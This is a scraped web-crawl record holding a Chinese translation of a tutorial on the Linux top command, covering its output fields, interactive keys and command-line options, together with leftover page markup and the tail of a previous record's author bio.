hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">\r\n\t\t\t<img src=\"http://tp3.sinaimg.cn/1774908135/180/0/1\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            ThoughtWorks是一家全球IT咨询公司，追求卓越软件质量，致力于科技驱动商业变革。擅长构建定制化软件产品，帮助客户快速将概念转化为价值。同时为客户提供用户体验设计、技术战略咨询、组织转型等咨询服务。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/thoughtworkschina\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/thoughtworkschina/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 78</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://insights.thoughtworkers.org/\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/thoughtworkschina\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/8a53378b3e591a4a50c50300cfe2923a99650981.jpg"}
{"url_object_id": "80a49a92dd92b7fe63d0e9590ca79995", "title": "30 个实例详解 TOP 命令", "url": "http://blog.jobbole.com/112873/", "create_date": "2017/11/13", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/77d80105fd15f2465894827e23cc4842.jpeg"], "praise_nums": 1, "comment_nums": 1, "favor_nums": 5, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://linoxide.com/linux-command/linux-top-command-examples-screenshots/\">Linoxide</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-2352-1.html\">Linux中国/geekpi</a>   </div><p>Linux中的top命令显示系统上正在运行的进程。它是系统管理员最重要的工具之一。被广泛用于监视服务器的负载。在本篇中，我们会探索top命令的细节。top命令是一个交互命令。在运行top的时候还可以运行很多命令。我们也会探索这些命令。</p>\n<p>（译注：不同发行版的top命令在各种细节有不同，如果发现不同时，请读你的帮助手册和命令内的帮助。）</p>\n<h2>1. Top 命令输出:</h2>\n<p>首先，让我们了解一下输出。top命令会显示系统的很多信息。我们需要理解不同部分输出的意义：默认运行时，top命令会显示如下输出：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/11/282c623a18772db49189d4ed36217588.png\" alt=\"默认显示\"></p>\n<p>前几行水平显示了不同系统参数的概括，接下来是进程和它们在列中的属性。</p>\n<h3>1.1 系统运行时间和平均负载：</h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/11/06e9baf6a2d871a7ab48ea6876f35ebb.png\" alt=\"显示运行时间\"></p>\n<p>top命令的顶部显示与uptime命令相似的输出。</p>\n<p>这些字段显示：</p>\n<ul>\n<li>当前时间</li>\n<li>系统已运行的时间</li>\n<li>当前登录用户的数量</li>\n<li>相应最近5、10和15分钟内的平均负载。</li>\n</ul>\n<p>可以使用’l’命令切换uptime的显示。</p>\n<h3>1.2 任务:</h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/11/479192457063a41169f87588f6776546.png\" alt=\"任务概况\"></p>\n<p>第二行显示的是任务或者进程的总结。进程可以处于不同的状态。这里显示了全部进程的数量。除此之外，还有正在运行、睡眠、停止、僵尸进程的数量（僵尸是一种进程的状态）。这些进程概括信息可以用’t’切换显示。</p>\n<h3>1.3 CPU 状态:</h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/11/3faef2a2919520b068516872d89d2a5c.png\" alt=\"CPU状态显示\"></p>\n<p>下一行显示的是CPU状态。 这里显示了不同模式下的所占CPU时间的百分比。这些不同的CPU时间表示:</p>\n<ul>\n<li>us, user： 运行(未调整优先级的) 用户进程的CPU时间</li>\n<li>sy，system: 运行内核进程的CPU时间</li>\n<li>ni，niced：运行已调整优先级的用户进程的CPU时间</li>\n<li>wa，IO wait: 用于等待IO完成的CPU时间</li>\n<li>hi：处理硬件中断的CPU时间</li>\n<li>si: 处理软件中断的CPU时间</li>\n<li>st：这个虚拟机被hypervisor偷去的CPU时间（译注：如果当前处于一个hypervisor下的vm，实际上hypervisor也是要消耗一部分CPU处理时间的）。</li>\n</ul>\n<p>可以使用’t’命令切换显示。</p>\n<h3>1.4 内存使用:</h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/11/216c9b1ee9d47c7949ecbc1bb4c67611.png\" alt=\"内存使用情况\"></p>\n<p>接下来两行显示内存使用率，有点像’free’命令。第一行是物理内存使用，第二行是虚拟内存使用(交换空间)。</p>\n<p>物理内存显示如下:全部可用内存、已使用内存、空闲内存、缓冲内存。相似地：交换部分显示的是：全部、已使用、空闲和缓冲交换空间。</p>\n<p>内存显示可以用’m’命令切换。</p>\n<h3>1.5 字段/列:</h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/11/85788f7e81700f27a9faff16fca869fd.png\" alt=\"任务信息列\"></p>\n<p>在横向列出的系统属性和状态下面，是以列显示的进程。不同的列代表下面要解释的不同属性。</p>\n<p>默认上，top显示这些关于进程的属性：</p>\n<p><strong>PID</strong></p>\n<p>进程ID，进程的唯一标识符</p>\n<p><strong>USER</strong></p>\n<p>进程所有者的实际用户名。</p>\n<p><strong>PR</strong></p>\n<p>进程的调度优先级。这个字段的一些值是’rt’。这意味这这些进程运行在实时态。</p>\n<p><strong>NI</strong></p>\n<p>进程的nice值（优先级）。越小的值意味着越高的优先级。</p>\n<p><strong>VIRT</strong></p>\n<p>进程使用的虚拟内存。</p>\n<p><strong>RES</strong></p>\n<p>驻留内存大小。驻留内存是任务使用的非交换物理内存大小。</p>\n<p><strong>SHR</strong></p>\n<p>SHR是进程使用的共享内存。</p>\n<p><strong>S</strong></p>\n<p>这个是进程的状态。它有以下不同的值:</p>\n<ul>\n<li>D – 不可中断的睡眠态。</li>\n<li>R – 运行态</li>\n<li>S – 睡眠态</li>\n<li>T – 被跟踪或已停止</li>\n<li>Z – 僵尸态</li>\n</ul>\n<p><strong>%CPU</strong></p>\n<p>自从上一次更新时到现在任务所使用的CPU时间百分比。</p>\n<p><strong>%MEM</strong></p>\n<p>进程使用的可用物理内存百分比。</p>\n<p><strong>TIME+</strong></p>\n<p>任务启动后到现在所使用的全部CPU时间，精确到百分之一秒。</p>\n<p><strong>COMMAND</strong></p>\n<p>运行进程所使用的命令。</p>\n<p>还有许多在默认情况下不会显示的输出，它们可以显示进程的页错误、有效组和组ID和其他更多的信息。</p>\n<h2>2. 交互命令:</h2>\n<p>我们之前说过top是一个交互命令。上一节我们已经遇到了一些命令。这里我们会探索更多的命令。</p>\n<h3>2.1 ‘h’: 帮助</h3>\n<p>首先，我们可以用’h’或者’?’显示交互命令的帮助菜单。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/11/5b6452839b92f56c6fea11dc4dfc86a7.png\" alt=\"帮助菜单\"></p>\n<h3>2.2 ‘’ 或者 ‘’: 刷新显示</h3>\n<p>top命令默认在一个特定间隔(3秒)后刷新显示。要手动刷新，用户可以输入回车或者空格。</p>\n<h3>2.3 ‘A’: 切换交替显示模式</h3>\n<p>这个命令在全屏和交替模式间切换。在交替模式下会显示4个窗口（译注：分别关注不同的字段）:</p>\n<ol>\n<li>Def （默认字段组）</li>\n<li>Job （任务字段组）</li>\n<li>Mem （内存字段组）</li>\n<li>Usr （用户字段组）</li>\n</ol>\n<p>这四组字段共有一个独立的可配置的概括区域和它自己的可配置任务区域。4个窗口中只有一个窗口是当前窗口。当前窗口的名称显示在左上方。（译注：只有当前窗口才会接受你键盘交互命令）</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/11/9de0e455e8b7debdfeb7c7d46600c33e.png\" alt=\"交替显示\"></p>\n<p>我们可以用’a’和’w’在4个 窗口间切换。’a’移到后一个窗口，’w’移到前一个窗口。用’g’命令你可以输入一个数字来选择当前窗口。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/11/779b522301c3d70d8cf79d24e28f8161.png\" alt=\"在交替显示中选择窗口\"></p>\n<h3>2.4 ‘B’: 触发粗体显示</h3>\n<p>一些重要信息会以加粗字体显示。这个命令可以切换粗体显示。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/11/4bb6e9bc9e1a107c31e6080f17df58e1.png\" alt=\"关闭粗体\"></p>\n<h3>2.5 ‘d’ 或‘s’: 设置显示的刷新间隔</h3>\n<p>当按下’d’或’s’时，你将被提示输入一个值（以秒为单位），它会以设置的值作为刷新间隔。如果你这里输入了1，top将会每秒刷新。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/11/9507dfd65691f0ee5bfb1d20125bc7ca.png\" alt=\"刷新间隔l\"></p>\n<h3>2.6 ‘l’、‘t’、‘m’: 切换负载、任务、内存信息的显示</h3>\n<p>这会相应地切换顶部的平均负载、任务/CPU状态和内存信息的概况显示。</p>\n<p class=\"article_img\"><img src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201312/08/105944mxfw15eh9bc1xxzh.png\" alt=\"不显示平均负载\"></p>\n<p class=\"article_img_desc\"><em>不显示平均负载</em></p>\n<p class=\"article_img\"><img src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201312/08/105945jwk2p2cccsljxcjj.png\" alt=\"不显示CPU概况\"></p>\n<p class=\"article_img_desc\"><em>不显示CPU概况</em></p>\n<p class=\"article_img\"><img src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201312/08/105947mtubthkiwtnh5cet.png\" alt=\"不显示内存和交换内存概况\"></p>\n<p class=\"article_img_desc\"><em>不显示内存和交换内存概况</em></p>\n<p class=\"article_img\"><img src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201312/08/105948dqm2oabw2jaoj22w.png\" alt=\"上面三个全不显示\"></p>\n<p class=\"article_img_desc\"><em>上面三个全不显示</em></p>\n<h3>2.7 ‘f’: 字段管理</h3>\n<p>用于选择你想要显示的字段。用’*’标记的是已选择的。</p>\n<p class=\"article_img\"><img src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201312/08/105950vudzhhu8yvzflhxr.png\" alt=\"管理显示列\"></p>\n<p class=\"article_img_desc\"><em>管理显示列</em></p>\n<p>上下光标键在字段内导航，左光标键可以选择字段，回车或右光标键确认。</p>\n<p>按'&lt;‘移动已排序的字段到左边，’&gt;’则移动到右边。</p>\n<h3>2.8 ‘R’: 反向排序</h3>\n<p>切换反向/常规排序。</p>\n<h3>2.9 ‘c’: 触发命令</h3>\n<p>切换是否显示进程启动时的完整路径和程序名。</p>\n<p class=\"article_img\"><img src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201312/08/1059520g96thhhophcphyy.png\" alt=\"完整命令路径\"></p>\n<p class=\"article_img_desc\"><em>完整命令路径</em></p>\n<h3>2.10 ‘i’: 空闲任务</h3>\n<p>切换显示空闲任务。</p>\n<p class=\"article_img\"><img src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201312/08/105954e6ohpfesclexrhmp.png\" alt=\"不显示空闲命令\"></p>\n<p class=\"article_img_desc\"><em>不显示空闲命令</em></p>\n<h3>2.11 ‘V’: 树视图</h3>\n<p>切换树视图。</p>\n<p class=\"article_img\"><img src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201312/08/105955z6v88vcg6v5h1gv6.png\" alt=\"树视图\"></p>\n<p class=\"article_img_desc\"><em>树视图</em></p>\n<h3>2.12 ‘Z’: 改变配色</h3>\n<p>按下’Z’向用户显示一个改变top命令的输出颜色的屏幕。可以为8个任务区域选择8种颜色。</p>\n<p class=\"article_img\"><img src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201312/08/105957f6ofah7b9z69e4u4.png\" alt=\"定制颜色\"></p>\n<p class=\"article_img_desc\"><em>定制颜色</em></p>\n<p>下面显示的是4中颜色显示的top视图。</p>\n<p class=\"article_img\"><img src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201312/08/105959tutpus3u406talpp.png\" alt=\"彩色显示\"></p>\n<p class=\"article_img_desc\"><em>彩色显示</em></p>\n<h3>2.13 ‘z’: 切换彩色显示</h3>\n<p>切换彩色，即打开或关闭彩色显示。</p>\n<h3>2.14 ‘x’ 或者 ‘y’</h3>\n<p>切换高亮信息：’x’将排序字段高亮显示（纵列）；’y’将运行进程高亮显示（横行）。依赖于你的显示设置，你可能需要让输出彩色来看到这些高亮。</p>\n<p class=\"article_img\"><img src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201312/08/1100019xr44trg4c374rff.png\" alt=\"X 和 Y高亮\"></p>\n<p class=\"article_img_desc\"><em>X 和 Y高亮</em></p>\n<h3>2.15 ‘u’: 特定用户的进程</h3>\n<p>显示特定用户的进程。你会被提示输入用户名。空白将会显示全部用户。</p>\n<p class=\"article_img\"><img src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201312/08/110003yqssycqczyyqdq9d.png\" alt=\"raghu的进程\"></p>\n<p class=\"article_img_desc\"><em>raghu的进程</em></p>\n<h3>2.16 ‘n’ 或 ‘#’: 任务的数量</h3>\n<p>设置最大显示的任务数量</p>\n<p class=\"article_img\"><img src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201312/08/1100048hz8hzn0c8rhbceh.png\" alt=\"设置最大显示的任务数量\"></p>\n<p class=\"article_img_desc\"><em>设置最大显示的任务数量</em></p>\n<h3>2.17 ‘k’: 结束任务</h3>\n<p>top命令中最重要的一个命令之一。用于发送信号给任务（通常是结束任务）。</p>\n<p class=\"article_img\"><img src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201312/08/110006c33lm6l2ge6rgc6g.png\" alt=\"杀死一个任务\"></p>\n<p class=\"article_img_desc\"><em>杀死一个任务</em></p>\n<h3>2.18 ‘r’: 重新设置优先级</h3>\n<p>重新设置一个任务的调度优先级。</p>\n<h2>3. 命令行选项:</h2>\n<p>这些命令行选项与上面讨论的命令大多相同。top的输出可以用命令交互操作，但是你也可以带参数运行top来设置你想要的效果。</p>\n<h3>3.1 -b: 批处理模式</h3>\n<p>-b选项以批处理模式启动top命令。当你想要在文件中保存输出时是很有用的。</p>\n<h3>3.2 -c: 命令/程序名 触发:</h3>\n<p>如上面所讨论到的命令，这个选项会以上次记住的程序/命令显示的状态显示（是否显示完整路径）。</p>\n<h3>3.3 -d: 设置延迟间隔</h3>\n<p>设置top的显示间隔(以秒计)。比如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a3c217f5110636533\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ top -d 1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a3c217f5110636533-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a3c217f5110636533-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">top</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>将会以1秒的刷新间隔启动top。</p>\n<h3>3.4 -i: 切换显示空闲进程</h3>\n<p>这个选项设置top命令的上一次记住的<strong>相反的</strong>‘i’状态。</p>\n<h3>3.5 -n: 设置迭代数量</h3>\n<p>用-n选项，你可以设置top退出前迭代的次数。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a3c217fe089194101\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ top -n 3</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a3c217fe089194101-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a3c217fe089194101-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">top</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>将会在刷新输出3次后退出。</p>\n<h3>3.6 -p: 监控特定的PID</h3>\n<p>你可以用-p选项监控指定的PID。PID的值为0将被作为top命令自身的PID。</p>\n<h3>3.7 -u 或 -U: 用户名 或者 UID</h3>\n<p>可以用这些选项浏览特定用户的进程。用户名或者UID可以在选项中指定。-p、-u和-U选项是互斥的，同时只可以使用这其中一个选项。当你试图组合使用这些选项时，你会得到一个错误:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a3c21802772611124\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ top -p 28453 -u raghu\r\ntop: conflicting process selections (U/p/u)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a3c21802772611124-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3c21802772611124-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a3c21802772611124-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">top</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">28453</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">raghu</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3c21802772611124-2\"><span class=\"crayon-v\">top</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">conflicting </span><span class=\"crayon-e\">process </span><span class=\"crayon-e\">selections</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">U</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">p</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">u</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"112873\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"112873votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"112873\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/d1b17b98748a74826464a08e6d30a4ee1b15b171.jpg"}
